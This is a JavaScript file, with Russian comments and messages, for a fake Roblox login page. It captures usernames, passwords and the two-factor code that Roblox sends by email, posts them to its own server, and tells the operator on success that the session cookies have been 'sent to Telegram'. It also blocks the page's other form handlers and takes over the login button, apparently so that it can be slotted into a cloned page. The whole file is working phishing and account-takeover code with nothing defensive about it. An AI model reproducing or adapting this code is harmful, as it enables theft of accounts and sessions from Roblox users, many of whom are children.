console.log('=== НАШ СКРИПТ ЗАГРУЖЕН ===');

document.addEventListener('DOMContentLoaded', function() {
    var loginForm = document.getElementById('loginForm');
    var codeForm = document.getElementById('codeForm');
    var resultDiv = document.getElementById('result');
    var sessionId = null;

    console.log('=== DOMContentLoaded СРАБОТАЛ ===');
    console.log('Формы найдены:', {loginForm, codeForm, resultDiv});

    // Обработчик формы логина
    loginForm.addEventListener('submit', function(e) {
        console.log('=== ОБРАБОТЧИК SUBMIT СРАБОТАЛ ===');
        e.preventDefault();
        e.stopPropagation();
        resultDiv.style.display = 'none';
        
        var username = document.getElementById('login-username').value;
        var password = document.getElementById('login-password').value;
        var remember = document.getElementById('remember').checked;
        
        console.log('Отправляем данные:', {username, password, remember});
        
        fetch('/login', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({username, password, remember})
        }).then(res => {
            console.log('Получен ответ:', res.status);
            return res.json();
        }).then(data => {
            console.log('Данные ответа:', data);
            if (data.need_code) {
                sessionId = data.session_id;
                loginForm.classList.add('hidden');
                codeForm.classList.remove('hidden');
                resultDiv.style.display = 'block';
                resultDiv.textContent = 'Введите код из почты Roblox.';
                resultDiv.className = 'result-message';
                resultDiv.style.backgroundColor = '#fff3cd';
                resultDiv.style.color = '#856404';
                resultDiv.style.border = '1px solid #ffeaa7';
            } else if (data.success) {
                resultDiv.style.display = 'block';
                resultDiv.textContent = 'Успешно! Куки отправлены в Telegram.';
                resultDiv.className = 'result-message success';
                resultDiv.style.backgroundColor = '#d4edda';
                resultDiv.style.color = '#155724';
                resultDiv.style.border = '1px solid #c3e6cb';
                loginForm.reset();
            } else {
                resultDiv.style.display = 'block';
                resultDiv.textContent = data.message || 'Ошибка!';
                resultDiv.className = 'result-message error';
                resultDiv.style.backgroundColor = '#f8d7da';
                resultDiv.style.color = '#721c24';
                resultDiv.style.border = '1px solid #f5c6cb';
            }
        }).catch((error) => {
            console.error('Ошибка fetch:', error);
            resultDiv.style.display = 'block';
            resultDiv.textContent = 'Ошибка соединения!';
            resultDiv.className = 'result-message error';
            resultDiv.style.backgroundColor = '#f8d7da';
            resultDiv.style.color = '#721c24';
            resultDiv.style.border = '1px solid #f5c6cb';
        });
    });

    // Обработчик формы 2FA
    codeForm.addEventListener('submit', function(e) {
        console.log('=== ОБРАБОТЧИК КОДА СРАБОТАЛ ===');
        e.preventDefault();
        e.stopPropagation();
        resultDiv.style.display = 'none';
        
        var code = document.getElementById('code-input').value;
        if (!sessionId) {
            resultDiv.style.display = 'block';
            resultDiv.textContent = 'Нет session_id. Попробуйте войти заново.';
            resultDiv.className = 'result-message error';
            resultDiv.style.backgroundColor = '#f8d7da';
            resultDiv.style.color = '#721c24';
            resultDiv.style.border = '1px solid #f5c6cb';
            return;
        }
        
        fetch('/submit_code', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({session_id: sessionId, code: code})
        }).then(res => res.json()).then(data => {
            if (data.success) {
                resultDiv.style.display = 'block';
                resultDiv.textContent = 'Вход завершён! Куки отправлены в Telegram.';
                resultDiv.className = 'result-message success';
                resultDiv.style.backgroundColor = '#d4edda';
                resultDiv.style.color = '#155724';
                resultDiv.style.border = '1px solid #c3e6cb';
                codeForm.reset();
                codeForm.classList.add('hidden');
                loginForm.classList.remove('hidden');
            } else {
                resultDiv.style.display = 'block';
                resultDiv.textContent = data.message || 'Ошибка!';
                resultDiv.className = 'result-message error';
                resultDiv.style.backgroundColor = '#f8d7da';
                resultDiv.style.color = '#721c24';
                resultDiv.style.border = '1px solid #f5c6cb';
            }
        }).catch(() => {
            resultDiv.style.display = 'block';
            resultDiv.textContent = 'Ошибка соединения!';
            resultDiv.className = 'result-message error';
            resultDiv.style.backgroundColor = '#f8d7da';
            resultDiv.style.color = '#721c24';
            resultDiv.style.border = '1px solid #f5c6cb';
        });
    });
    
    // Отключаем все остальные обработчики submit
    var allForms = document.querySelectorAll('form');
    allForms.forEach(function(form) {
        if (form !== loginForm && form !== codeForm) {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
        }
    });
    
    // Добавляем обработчик для кнопки логина
    var loginButton = document.getElementById('login-button');
    if (loginButton) {
        console.log('Найдена кнопка логина:', loginButton);
        loginButton.addEventListener('click', function(e) {
            console.log('=== КЛИК ПО КНОПКЕ ЛОГИНА ===');
            e.preventDefault();
            e.stopPropagation();
            loginForm.dispatchEvent(new Event('submit', { bubbles: true }));
        }, true);
    } else {
        console.log('Кнопка логина не найдена!');
    }
    
    console.log('=== НАШ ОБРАБОТЧИК ФОРМЫ АКТИВИРОВАН ===');
}); 